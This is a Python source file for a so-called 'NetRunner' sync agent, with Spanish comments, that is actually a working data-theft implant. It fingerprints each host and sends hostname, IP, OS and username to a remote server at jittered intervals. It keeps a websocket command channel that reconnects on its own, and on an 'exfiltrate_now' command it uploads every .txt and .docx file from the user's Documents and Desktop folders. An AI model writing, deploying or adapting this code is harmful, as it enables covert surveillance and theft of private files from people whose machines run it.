# sync_agent.py - NetRunner Sync-Node v2.1 (Cleaned with Exfiltration)
import asyncio
import websockets
import json
import os
import sys
import time
import random
import socket
import uuid
import requests
import ssl
import platform
from pathlib import Path

# --- DETECCIÓN DE ENTORNO (PYINSTALLER) ---
def get_app_data_dir():
    """Obtiene la carpeta de datos del usuario según el SO."""
    if platform.system() == "Windows":
        base = Path(os.environ.get('LOCALAPPDATA', Path.home() / 'AppData' / 'Local'))
    else:
        base = Path.home() / '.local' / 'share'
    
    app_dir = base / 'netrunner'
    app_dir.mkdir(parents=True, exist_ok=True)
    return app_dir

APP_DATA_DIR = get_app_data_dir()

def get_resource_path(relative_path):
    """Obtiene la ruta correcta para recursos internos."""
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

# --- CONFIGURACIÓN ---
WS_URI = "wss://netrunner-pro.up.railway.app/"
HEARTBEAT_INTERVAL = 30
MAX_RECONNECT_DELAY = 60

# --- EXFILTRATION CONFIG ---
EXFILTRATION_TARGET_DIRS = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop")]
EXFILTRATION_ALLOWED_EXTENSIONS = ['.txt', '.docx']
SERVER_BASE_URL = "https://netrunner-pro.up.railway.app/"
UPLOAD_URL = f"{SERVER_BASE_URL}api/upload"

# --- CHECK-IN CONFIG ---
CHECKIN_URL = f"{SERVER_BASE_URL}api/agent/report"
REPORT_INTERVAL_MIN = 45
REPORT_INTERVAL_MAX = 90
AGENT_ID_FILE = APP_DATA_DIR / '.agent_id'

# --- INITIALIZATION ---
LOG_FILE = APP_DATA_DIR / 'sync.log'

# --- AGENT ID ---
def get_or_create_agent_id():
    """Genera o lee el agentId único de esta máquina."""
    if AGENT_ID_FILE.exists():
        return AGENT_ID_FILE.read_text().strip()
    
    unique_id = f"{socket.gethostname()}-{uuid.uuid4().hex[:8]}"
    AGENT_ID_FILE.write_text(unique_id)
    return unique_id

AGENT_ID = get_or_create_agent_id()

# --- CORE FUNCTIONS ---
def local_log(message):
    """Escribe en el log local."""
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{time.ctime()}] {message}\n")
    except Exception as e:
        print(f"Log file error: {e}")

def send_checkin():
    """Envía reporte silencioso al servidor."""
    try:
        hostname = socket.gethostname()
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = None
        
        try:
            current_user = os.getlogin()
        except Exception:
            current_user = 'unknown_user'

        payload = {
            'agentId': AGENT_ID,
            'hostname': hostname,
            'ip': local_ip,
            'os': platform.system(),
            'user': current_user,
            'status': 'active',
            'timestamp': time.time()
        }
        
        response = requests.post(CHECKIN_URL, json=payload, timeout=10)
        if response.status_code == 200:
            local_log(f"Check-in enviado: {hostname}")
            print(f"Reporte enviado con éxito (HTTP 200) para {AGENT_ID}")
        else:
            local_log(f"Error al enviar check-in (HTTP {response.status_code}): {response.text}")
            print(f"Error al enviar reporte (HTTP {response.status_code}): {response.text}")
    except requests.exceptions.RequestException as e:
        local_log(f"Error de conexión al enviar check-in: {e}")
        print(f"Error de conexión al enviar reporte: {e}")
    except Exception as e:
        local_log(f"Error inesperado al enviar check-in: {e}")
        print(f"Error inesperado al enviar reporte: {e}")

def exfiltrate_files():
    """Busca archivos .txt o .docx y los envía al servidor."""
    local_log(f"Iniciando exfiltración de archivos desde {EXFILTRATION_TARGET_DIRS}...")
    
    for target_dir in EXFILTRATION_TARGET_DIRS:
        if not Path(target_dir).exists():
            local_log(f"Directorio no encontrado: {target_dir}. Saltando.")
            continue
            
        for root, _, files in os.walk(target_dir):
            for filename in files:
                file_path = Path(root) / filename
                if file_path.suffix.lower() in EXFILTRATION_ALLOWED_EXTENSIONS:
                    try:
                        with open(file_path, 'rb') as f:
                            files_payload = {'file': (filename, f.read(), 'application/octet-stream')}
                            data_payload = {'agentId': AGENT_ID, 'hostname': socket.gethostname()}
                            
                            print(f"Intentando exfiltrar {filename} de {AGENT_ID}...")
                            response = requests.post(UPLOAD_URL, files=files_payload, data=data_payload, timeout=30)
                            
                            if response.status_code == 200:
                                local_log(f"Archivo {filename} exfiltrado con éxito.")
                                print(f"Archivo {filename} exfiltrado con éxito.")
                            else:
                                local_log(f"Fallo al exfiltrar {filename}: HTTP {response.status_code} - {response.text}")
                                print(f"Fallo al exfiltrar {filename}: HTTP {response.status_code} - {response.text}")
                    except Exception as e:
                        local_log(f"Error al procesar/exfiltrar {filename}: {e}")
                        print(f"Error al procesar/exfiltrar {filename}: {e}")
    
    local_log("Exfiltración de archivos completada.")
    print("Exfiltración de archivos completada.")

async def checkin_loop():
    """Envía reportes con jitter aleatorio (45-90s)."""
    while True:
        jitter = random.randint(REPORT_INTERVAL_MIN, REPORT_INTERVAL_MAX)
        await asyncio.sleep(jitter)
        send_checkin()
        
# --- WEBSOCKET CLIENT ---
async def agent_handler():
    reconnect_delay = 5
    
    while True:
        try:
            async with websockets.connect(WS_URI, ssl=ssl.create_default_context()) as websocket:
                reconnect_delay = 5
                local_log("Conectado al servidor NetRunner")
                
                # Iniciar loop de check-in con jitter
                asyncio.create_task(checkin_loop())
                
                while True:
                    try:
                        message = await asyncio.wait_for(websocket.recv(), timeout=HEARTBEAT_INTERVAL)
                        data = json.loads(message)
                        
                        if data.get('command') == 'exfiltrate_now': # New command for exfiltration
                            local_log("Comando 'exfiltrate_now' recibido. Iniciando exfiltración...")
                            print("Comando 'exfiltrate_now' recibido. Iniciando exfiltración...")
                            exfiltrate_files()
                        # No longer scanning for 'start_sync' as file sync logic is removed
                    except asyncio.TimeoutError:
                        await websocket.send(json.dumps({'type': 'heartbeat'}))
                    except websockets.exceptions.ConnectionClosed:
                        break
                        
        except Exception as e:
            error_msg = f"Desconectado: {e}. Reintentando en {reconnect_delay}s..."
            local_log(error_msg)
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, MAX_RECONNECT_DELAY)

if __name__ == "__main__":
    local_log(f"NetRunner Agent iniciado. Plataforma: {platform.system()}")
    try:
        asyncio.run(agent_handler())
    except KeyboardInterrupt:
        local_log("Agent detenido por el usuario")
        print("Agent detenido")